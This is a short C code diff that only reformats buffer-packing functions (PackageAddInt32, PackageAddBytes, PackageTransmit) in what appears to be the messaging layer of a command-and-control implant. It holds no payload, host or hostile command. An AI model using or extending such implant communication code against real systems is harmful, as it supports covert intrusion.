@@ -38,11 +38,8 @@ VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size ) {
 }
 
 VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt ) {
-    Package->Buffer = LocalReAlloc(
-            Package->Buffer,
-            Package->Length + sizeof( UINT32 ),
-            LMEM_MOVEABLE
-    );
+
+    Package->Buffer = LocalReAlloc(Package->Buffer,Package->Length + sizeof( UINT32 ),LMEM_MOVEABLE);
 
     Int32ToBuffer( Package->Buffer + Package->Length, dataInt );
 
@@ -51,11 +48,7 @@ VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt ) {
 }
 
 VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt ) {
-    Package->Buffer = LocalReAlloc(
-            Package->Buffer,
-            Package->Length + sizeof( UINT64 ),
-            LMEM_MOVEABLE
-    );
+    Package->Buffer = LocalReAlloc(Package->Buffer,Package->Length + sizeof( UINT64 ),LMEM_MOVEABLE);
 
     Int64ToBuffer( Package->Buffer + Package->Length, dataInt );
 
@@ -64,11 +57,7 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt ) {
 }
 
 VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size ) {
-    Package->Buffer = LocalReAlloc(
-            Package->Buffer,
-            Package->Length + Size,
-            LMEM_MOVEABLE | LMEM_ZEROINIT
-    );
+    Package->Buffer = LocalReAlloc(Package->Buffer,Package->Length + Size,LMEM_MOVEABLE | LMEM_ZEROINIT);
 
     mem_cpy( Package->Buffer + ( Package->Length ), Data, Size );
 
@@ -80,11 +69,7 @@ VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size ) {
 VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size ) {
     PackageAddInt32( Package, Size );
 
-    Package->Buffer = LocalReAlloc(
-            Package->Buffer,
-            Package->Length + Size,
-            LMEM_MOVEABLE | LMEM_ZEROINIT
-    );
+    Package->Buffer = LocalReAlloc(Package->Buffer,Package->Length + Size,LMEM_MOVEABLE | LMEM_ZEROINIT);
 
     Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );
 
@@ -154,8 +139,7 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size ) {
             Success = TRUE;
         }
         PackageDestroy( Package );
-    }
-    else {
+    }else {
         Success = FALSE;
     }
 
